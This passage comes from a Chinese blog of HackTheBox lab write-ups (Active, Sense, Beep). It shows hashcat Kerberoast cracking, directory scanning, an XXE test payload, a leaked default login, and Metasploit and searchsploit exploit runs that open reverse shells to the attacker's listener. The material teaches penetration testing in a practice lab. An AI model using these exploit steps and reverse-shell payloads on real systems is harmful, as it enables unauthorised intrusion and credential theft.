class="line">.\Replication\active.htb\Policies\&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;\Group Policy\*</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 .</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 ..</span><br><span class="line">fr--r--r-- 119 Sat Jul 21 18:38:11 2018 GPE.INI</span><br><span class="line">.\Replication\active.htb\Policies\&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;\MACHINE\*</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 .</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 ..</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 Microsoft</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 Preferences</span><br><span class="line">fr--r--r-- 2788 Sat Jul 21 18:38:11 2018 Registry.pol</span><br><span class="line">.\Replication\active.htb\Policies\&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;\MACHINE\Microsoft\*</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 .</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 ..</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 Windows NT</span><br><span class="line">.\Replication\active.htb\Policies\&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;\MACHINE\Preferences\*</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 .</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 ..</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 Groups</span><br><span class="line">.\Replication\active.htb\Policies\&#123;6AC1786C-016F-11D2-945F-00C04fB984F9&#125;\*</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 .</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 ..</span><br><span class="line">fr--r--r-- 22 Sat Jul 21 18:38:11 2018 GPT.INI</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 MACHINE</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 USER</span><br><span class="line">.\Replication\active.htb\Policies\&#123;6AC1786C-016F-11D2-945F-00C04fB984F9&#125;\MACHINE\*</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 .</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 ..</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 Microsoft</span><br><span class="line">.\Replication\active.htb\Policies\&#123;6AC1786C-016F-11D2-945F-00C04fB984F9&#125;\MACHINE\Microsoft\*</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 .</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 ..</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 Windows NT</span><br><span class="line">SYSVOL NO ACCESS Logon server share</span><br><span class="line">Users NO ACCESS</span><br></pre></td></tr></table></figure>

<h2 id="用-hashcat-破解密码"><a href="#用-hashcat-破解密码" class="headerlink" title="用 hashcat 破解密码"></a>用 hashcat 破解密码</h2><p>以这里的为例</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 13100 -a 0 GetUserSPNs.out /usr/share/wordlists/rockyou.txt --force</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>13100</th>
<th>Kerberos 5 TGS-REP etype 23</th>
</tr>
</thead>
</table>
<blockquote>
<p>——<a href="https://hashcat.net/wiki/doku.php?id=example_hashes" target="_blank" rel="noopener">https://hashcat.net/wiki/doku.php?id=example_hashes</a></p>
</blockquote>
<ul>
<li><code>-a 0</code>代表使用字典破解模式；</li>
<li><code>-m 0</code>代表 Hash Type，此处查表知，对应编号为<code>13100</code>；</li>
<li><code>--force</code>代表运行时无视错误</li>
</ul>
<h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h1><ul>
<li>walkthrough:<a href="https://0xdf.gitlab.io/2018/12/08/htb-active.html" target="_blank" rel="noopener">https://0xdf.gitlab.io/2018/12/08/htb-active.html</a></li>
<li><a href="https://xz.aliyun.com/t/7726#toc-2" target="_blank" rel="noopener">域控提权合集 - 先知社区</a></li>
<li>hashcat 的各种格式<a href="https://hashcat.net/wiki/doku.php?id=example_hashes" target="_blank" rel="noopener">https://hashcat.net/wiki/doku.php?id=example_hashes</a></li>
<li>CME 的使用方法介绍<a href="https://byt3bl33d3r.github.io/getting-the-goods-with-crackmapexec-part-1.html" target="_blank" rel="noopener">https://byt3bl33d3r.github.io/getting-the-goods-with-crackmapexec-part-1.html</a></li>
<li>How-To-Attack-Kerberos-101: <a href="https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html" target="_blank" rel="noopener">https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html</a></li>
<li><a href="https://adsecurity.org/?p=2288" target="_blank" rel="noopener">Finding Passwords in SYSVOL &amp; Exploiting Group Policy Preferences – Active Directory Security</a></li>
<li><a href="https://www.lifewire.com/how-to-find-a-users-security-identifier-sid-in-windows-2625149" target="_blank" rel="noopener">https://www.lifewire.com/how-to-find-a-users-security-identifier-sid-in-windows-2625149</a></li>
<li><a href="https://3gstudent.github.io/3gstudent.github.io/域渗透-Kerberoasting/" target="_blank" rel="noopener">https://3gstudent.github.io/3gstudent.github.io/域渗透-Kerberoasting/</a></li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://unc1e.com/2020/05/29/yuque/HackTheBox%EF%BC%9ASense%E7%AC%94%E8%AE%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Unc1e">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Unc1e的博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/05/29/yuque/HackTheBox%EF%BC%9ASense%E7%AC%94%E8%AE%B0/" itemprop="url">HackTheBox：Sense笔记</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-05-29T13:12:57+08:00">
                2020-05-29
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<p>弄明白你打的网站，是什么 cms，跑的什么中间件，靶机风评如何，很有必要！</p>
</blockquote>
<p>10.10.10.60<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1590729425195-edd08efe-80aa-4fc8-8213-6be000a8f0fd.png#align=left&display=inline&height=230&margin=%5Bobject%20Object%5D&name=image.png&originHeight=460&originWidth=718&size=114205&status=done&style=none&width=359" alt="image.png">)<img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1590729534655-00471b96-ee98-450a-96b8-2890c99047c3.png#align=left&display=inline&height=225&margin=%5Bobject%20Object%5D&name=image.png&originHeight=449&originWidth=401&size=43455&status=done&style=none&width=200.5" alt="image.png"></p>
<h1 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># nmap -p- -sC -sV 10.10.10.60</span></span><br><span class="line"></span><br><span class="line">nmap scan report for 10.10.10.60</span><br><span class="line">Host is up (0.0058s latency).</span><br><span class="line">Not shown: 65533 filtered ports</span><br><span class="line">PORT    STATE SERVICE    VERSION</span><br><span class="line">80/tcp  open  http       lighttpd 1.4.35</span><br><span class="line">|_http-server-header: lighttpd/1.4.35</span><br><span class="line">|_http-title: Did not follow redirect to https://10.10.10.60/</span><br><span class="line">|_https-redirect: ERROR: Script execution failed (<span class="keyword">use</span> -d <span class="keyword">to</span> debug)</span><br><span class="line"><span class="number">443</span>/tcp <span class="keyword">open</span>  ssl/https?</span><br><span class="line">|_ssl-<span class="built_in">date</span>: TLS randomness does <span class="keyword">not</span> represent <span class="built_in">time</span></span><br></pre></td></tr></table></figure>

<h1 id="lighttpd-1-4-35"><a href="#lighttpd-1-4-35" class="headerlink" title="lighttpd 1.4.35"></a>lighttpd 1.4.35</h1><p>80 端口会跳转到 443，443 端口是这个 web<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1590766011762-f1f15c9a-d60e-43de-b3d3-6919607efa83.png#align=left&display=inline&height=497&margin=%5Bobject%20Object%5D&name=image.png&originHeight=994&originWidth=1577&size=170558&status=done&style=none&width=788.5" alt="image.png"></p>
<h2 id="dirb-扫目录"><a href="#dirb-扫目录" class="headerlink" title="dirb 扫目录"></a>dirb 扫目录</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">[~]$ dirb https://10.10.10.60</span><br><span class="line"></span><br><span class="line"><span class="comment">-----------------</span></span><br><span class="line">DIRB v2.22</span><br><span class="line">By The Dark Raver</span><br><span class="line"><span class="comment">-----------------</span></span><br><span class="line"></span><br><span class="line">START_TIME: Fri May 29 05:22:42 2020</span><br><span class="line">URL_BASE: https://10.10.10.60/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line"><span class="comment">-----------------</span></span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612</span><br><span class="line"></span><br><span class="line"><span class="comment">---- Scanning URL: https://10.10.10.60/ ----</span></span><br><span class="line">==&gt; DIRECTORY: https://10.10.10.60/classes/</span><br><span class="line">==&gt; DIRECTORY: https://10.10.10.60/css/</span><br><span class="line">+ https://10.10.10.60/favicon.ico (CODE:200|SIZE:1406)</span><br><span class="line">==&gt; DIRECTORY: https://10.10.10.60/includes/</span><br><span class="line">+ https://10.10.10.60/index.html (CODE:200|SIZE:329)</span><br><span class="line">+ https://10.10.10.60/index.php (CODE:200|SIZE:6690)</span><br><span class="line">==&gt; DIRECTORY: https://10.10.10.60/installer/</span><br><span class="line">==&gt; DIRECTORY: https://10.10.10.60/javascript/</span><br><span class="line">==&gt; DIRECTORY: https://10.10.10.60/themes/</span><br><span class="line">==&gt; DIRECTORY: https://10.10.10.60/tree/</span><br><span class="line">==&gt; DIRECTORY: https://10.10.10.60/widgets/</span><br><span class="line">+ https://10.10.10.60/xmlrpc.php (CODE:200|SIZE:384)</span><br><span class="line"></span><br><span class="line"><span class="comment">---- Entering directory: https://10.10.10.60/classes/ ----</span></span><br><span class="line"></span><br><span class="line"><span class="comment">---- Entering directory: https://10.10.10.60/css/ ----</span></span><br><span class="line"></span><br><span class="line"><span class="comment">---- Entering directory: https://10.10.10.60/includes/ ----</span></span><br><span class="line"></span><br><span class="line"><span class="comment">---- Entering directory: https://10.10.10.60/installer/ ----</span></span><br><span class="line">+ https://10.10.10.60/installer/index.php (CODE:302|SIZE:0)</span><br><span class="line"></span><br><span class="line"><span class="comment">---- Entering directory: https://10.10.10.60/javascript/ ----</span></span><br><span class="line">==&gt; DIRECTORY: https://10.10.10.60/javascript/index/</span><br><span class="line">==&gt; DIRECTORY: https://10.10.10.60/javascript/jquery/</span><br><span class="line">==&gt; DIRECTORY: https://10.10.10.60/javascript/wizard/</span><br><span class="line"></span><br><span class="line"><span class="comment">---- Entering directory: https://10.10.10.60/themes/ ----</span></span><br><span class="line"></span><br><span class="line"><span class="comment">---- Entering directory: https://10.10.10.60/tree/ ----</span></span><br><span class="line">+  (CODE:200|SIZE:7492)</span><br><span class="line"></span><br><span class="line"><span class="comment">---- Entering directory: https://10.10.10.60/widgets/ ----</span></span><br><span class="line">==&gt; DIRECTORY: https://10.10.10.60/widgets/include/</span><br><span class="line">==&gt; DIRECTORY: https://10.10.10.60/widgets/javascript/</span><br><span class="line">==&gt; DIRECTORY: https://10.10.10.60/widgets/widgets/</span><br><span class="line"></span><br><span class="line"><span class="comment">---- Entering directory: https://10.10.10.60/javascript/index/ ----</span></span><br><span class="line"></span><br><span class="line"><span class="comment">---- Entering directory: https://10.10.10.60/javascript/jquery/ ----</span></span><br><span class="line">==&gt; DIRECTORY: https://10.10.10.60/javascript/jquery/images/</span><br><span class="line"></span><br><span class="line"><span class="comment">---- Entering directory: https://10.10.10.60/javascript/wizard/ ----</span></span><br><span class="line"></span><br><span class="line"><span class="comment">---- Entering directory: https://10.10.10.60/widgets/include/ ----</span></span><br><span class="line"></span><br><span class="line"><span class="comment">---- Entering directory: https://10.10.10.60/widgets/javascript/ ----</span></span><br><span class="line"></span><br><span class="line"><span class="comment">---- Entering directory: https://10.10.10.60/widgets/widgets/ ----</span></span><br><span class="line"></span><br><span class="line"><span class="comment">---- Entering directory: https://10.10.10.60/javascript/jquery/images/ ----</span></span><br></pre></td></tr></table></figure>

<h3 id="xmlrpc-php"><a href="#xmlrpc-php" class="headerlink" title="/xmlrpc.php"></a>/xmlrpc.php</h3><p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1590731574070-bd7757a6-e59e-4f3e-8ba0-b994cbbeb732.png#align=left&display=inline&height=67&margin=%5Bobject%20Object%5D&name=image.png&originHeight=133&originWidth=842&size=22571&status=done&style=none&width=421" alt="image.png"></p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [ &lt;!ENTITY % pe SYSTEM "http://10.10.14.4:88"&gt; %pe; %param1; ]&gt;</span><br><span class="line">&lt;foo&gt;&amp;external;&lt;/foo&gt;</span><br></pre></td></tr></table></figure>

<p>测试过，无 xxe 问题</p>
<h3 id="tree-index-html"><a href="#tree-index-html" class="headerlink" title="/tree/index.html"></a>/tree/index.html</h3><p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1590733092577-5ab408a8-e773-4d0e-89fb-004d49d1e546.png#align=left&display=inline&height=987&margin=%5Bobject%20Object%5D&name=dragonfly.png&originHeight=987&originWidth=1910&size=236078&status=done&style=none&width=1910" alt="dragonfly.png"></p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">   Connect to host via SSH:</span><br><span class="line">   &lt;applet CODEBASE="." ARCHIVE="jta20.jar" CODE="de.mud.jta.Applet" WIDTH=55 HEIGHT=25&gt;</span><br><span class="line">&lt;param NAME="config" VALUE="applet.conf"&gt;</span><br><span class="line">   &lt;/applet&gt;</span><br></pre></td></tr></table></figure>

<p>不知道啥意思。。。</p>
<h1 id="breakthrough"><a href="#breakthrough" class="headerlink" title="breakthrough"></a>breakthrough</h1><p>用 dirbuster 再扫目录，用最大的字典</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br></pre></td></tr></table></figure>

<p>find something juicy，发现了些好东西</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># https://10.10.10.60//changelog.txt</span></span><br><span class="line">//内容如下</span><br><span class="line"><span class="comment"># Security Changelog</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### Issue</span></span><br><span class="line">There was a failure in updating the firewall. Manual patching is therefore required</span><br><span class="line"></span><br><span class="line"><span class="comment">### Mitigated</span></span><br><span class="line">2 of 3 vulnerabilities have been patched.</span><br><span class="line"></span><br><span class="line"><span class="comment">### Timeline</span></span><br><span class="line">The remaining patches will be installed during the next maintenance window</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># https://10.10.10.60/system-users.txt</span></span><br><span class="line">//内容如下</span><br><span class="line"><span class="comment">####Support ticket###</span></span><br><span class="line"></span><br><span class="line">Please <span class="keyword">create</span> the <span class="keyword">following</span> <span class="keyword">user</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">username: Rohit</span><br><span class="line"><span class="keyword">password</span>: company <span class="keyword">defaults</span></span><br></pre></td></tr></table></figure>

<p>公司默认密码？osint，搜索引擎走起<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1590766665129-28940fa6-a83a-4b18-b6ae-66eb2fd4de86.png#align=left&display=inline&height=450&margin=%5Bobject%20Object%5D&name=image.png&originHeight=899&originWidth=1554&size=143893&status=done&style=none&width=777" alt="image.png"></p>
<p>直接登录了哦，<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1590766843344-cc662a21-85d7-4ac0-bfbd-62ddf43506c4.png#align=left&display=inline&height=942&margin=%5Bobject%20Object%5D&name=logined.png&originHeight=942&originWidth=1613&size=177747&status=done&style=none&width=1613" alt="logined.png"></p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(unix/http/pfsense_graph_injection_exec) &gt; set username rohit</span><br><span class="line">username =&gt; rohit</span><br><span class="line">msf5 exploit(unix/http/pfsense_graph_injection_exec) &gt; set password pfsense</span><br><span class="line">password =&gt; pfsense</span><br><span class="line">msf5 exploit(unix/http/pfsense_graph_injection_exec) &gt; set lhost tun0</span><br><span class="line">lhost =&gt; 10.10.16.122</span><br><span class="line">msf5 exploit(unix/http/pfsense_graph_injection_exec) &gt; set rhosts 10.10.10.60</span><br><span class="line">rhosts =&gt; 10.10.10.60</span><br><span class="line">msf5 exploit(unix/http/pfsense_graph_injection_exec) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.16.122:4444</span><br><span class="line">[*] Detected pfSense 2.1.3-RELEASE, uploading intial payload</span><br><span class="line">[*] Payload uploaded successfully, executing</span><br><span class="line">[*] Sending stage (38288 bytes) to 10.10.10.60</span><br><span class="line">[*] Meterpreter session 1 opened (10.10.16.122:4444 -&gt; 10.10.10.60:39519) at 2020-05-29 23:26:58 +0800</span><br></pre></td></tr></table></figure>

<p>或者用 searchexploit 里的 exp 拿 shell<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1590767623073-864541e9-c3ab-45f9-97e5-4db13ce45006.png#align=left&display=inline&height=141&margin=%5Bobject%20Object%5D&name=py-exp.png&originHeight=141&originWidth=1187&size=57572&status=done&style=none&width=1187" alt="py-exp.png"></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python3 43560.py --rhost 10.10.10.60  --lhost 10.10.16.122 --lport 1337 --username rohit --password pfsense</span></span><br></pre></td></tr></table></figure>

<h1 id="复盘"><a href="#复盘" class="headerlink" title="复盘"></a>复盘</h1><p>一开始根本没锁定这个 pfSense,还是经验不够了，只注意了 lighttpd</p>
<ol>
<li>icon 跟 body 其实都有蛛丝马迹<img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1590766699999-b025290e-5406-4518-88bd-79875e00d0d8.png#align=left&display=inline&height=989&margin=%5Bobject%20Object%5D&name=clue.png&originHeight=989&originWidth=1919&size=331603&status=done&style=none&width=1919" alt="clue.png"></li>
<li>enumeration！<br>常用扫目录工具有 dirbuster+ dirb + wfuzz</li>
</ol>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://unc1e.com/2020/05/25/yuque/HackTheBox%EF%BC%9ABeep%E7%AC%94%E8%AE%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Unc1e">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Unc1e的博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/05/25/yuque/HackTheBox%EF%BC%9ABeep%E7%AC%94%E8%AE%B0/" itemprop="url">HackTheBox：Beep笔记</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-05-25T01:40:15+08:00">
                2020-05-25
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="elastix"><a href="#elastix" class="headerlink" title="elastix"></a>elastix</h2><p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1590342051488-5f1b2b4e-e643-47ad-b8d1-92e70849ad3a.png#align=left&display=inline&height=401&margin=%5Bobject%20Object%5D&name=image.png&originHeight=801&originWidth=1752&size=711881&status=done&style=none&width=876" alt="image.png"></p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(unix/http/freepbx_callmenum) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/unix/http/freepbx_callmenum):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting      Required  Description</span><br><span class="line">   <span class="comment">----       ---------------      --------  -----------</span></span><br><span class="line">   EXTENSION  230-240              yes       A range of Local extension numbers</span><br><span class="line">   Proxies    http:127.0.0.1:8080  no        A proxy chain of format type:host:port[,type:host:port][...]</span><br><span class="line">   RHOSTS     10.10.10.7           yes       The target host(s), range CIDR identifier, or hosts file <span class="keyword">with</span> syntax <span class="string">'file:&lt;path&gt;'</span></span><br><span class="line">   RPORT      <span class="number">443</span>                  yes       The target port (TCP)</span><br><span class="line">   SSL        <span class="literal">true</span>                 <span class="keyword">no</span>        Negotiate SSL/TLS <span class="keyword">for</span> outgoing connections</span><br><span class="line">   VHOST                           <span class="keyword">no</span>        <span class="keyword">HTTP</span> <span class="keyword">server</span> <span class="keyword">virtual</span> host</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (cmd/unix/<span class="keyword">reverse</span>):</span><br><span class="line"></span><br><span class="line">   <span class="keyword">Name</span>   <span class="keyword">Current</span> Setting  <span class="keyword">Required</span>  Description</span><br><span class="line">   <span class="comment">----   ---------------  --------  -----------</span></span><br><span class="line">   LHOST  <span class="number">10.10</span><span class="number">.16</span><span class="number">.122</span>     yes       The listen address (an <span class="keyword">interface</span> may be specified)</span><br><span class="line">   LPORT  <span class="number">4444</span>             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   <span class="keyword">Id</span>  <span class="keyword">Name</span></span><br><span class="line">   <span class="comment">--  ----</span></span><br><span class="line">   <span class="number">0</span>   <span class="keyword">Automatic</span> Target</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(unix/<span class="keyword">http</span>/freepbx_callmenum) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started <span class="keyword">reverse</span> TCP <span class="keyword">double</span> <span class="keyword">handler</span> <span class="keyword">on</span> <span class="number">10.10</span><span class="number">.16</span><span class="number">.122</span>:<span class="number">4444</span></span><br><span class="line">[*] <span class="number">10.10</span><span class="number">.10</span><span class="number">.7</span>:<span class="number">443</span> - Sending evil request <span class="keyword">with</span> <span class="keyword">range</span> <span class="number">230</span></span><br><span class="line">[*] <span class="number">10.10</span><span class="number">.10</span><span class="number">.7</span>:<span class="number">443</span> - Sending evil request <span class="keyword">with</span> <span class="keyword">range</span> <span class="number">231</span></span><br><span class="line">[*] <span class="number">10.10</span><span class="number">.10</span><span class="number">.7</span>:<span class="number">443</span> - Sending evil request <span class="keyword">with</span> <span class="keyword">range</span> <span class="number">232</span></span><br><span class="line">[*] <span class="number">10.10</span><span class="number">.10</span><span class="number">.7</span>:<span class="number">443</span> - Sending evil request <span class="keyword">with</span> <span class="keyword">range</span> <span class="number">233</span></span><br><span class="line">[*] <span class="number">10.10</span><span class="number">.10</span><span class="number">.7</span>:<span class="number">443</span> - Sending evil request <span class="keyword">with</span> <span class="keyword">range</span> <span class="number">234</span></span><br><span class="line">[*] Accepted the <span class="keyword">first</span> <span class="keyword">client</span> connection...</span><br><span class="line">[*] Accepted the <span class="keyword">second</span> <span class="keyword">client</span> connection...</span><br><span class="line">[*] Command: echo qaF1oILSz5kNCclV;</span><br><span class="line">[*] Writing to socket A</span><br><span class="line">[*] Writing to socket B</span><br><span class="line">[*] Reading from sockets...</span><br><span class="line">[*] Reading from socket B</span><br><span class="line">[*] B: "qaF1oILSz5kNCclV\r\n"</span><br><span class="line">[*] Matching...</span><br><span class="line">[*] A is input...</span><br><span class="line">[*] Command shell session 1 opened (10.10.16.122:4444 -&gt; 10.10.10.7:39534) at 2020-05-25 01:37:26 +0800</span><br></pre></td></tr></table></figure>

<h2 id="issue-to-fix"><a href="#issue-to-fix" class="headerlink" title="issue to fix"></a>issue to fix</h2><p>set ssl true</p>
<p><strong>issue</strong></p>
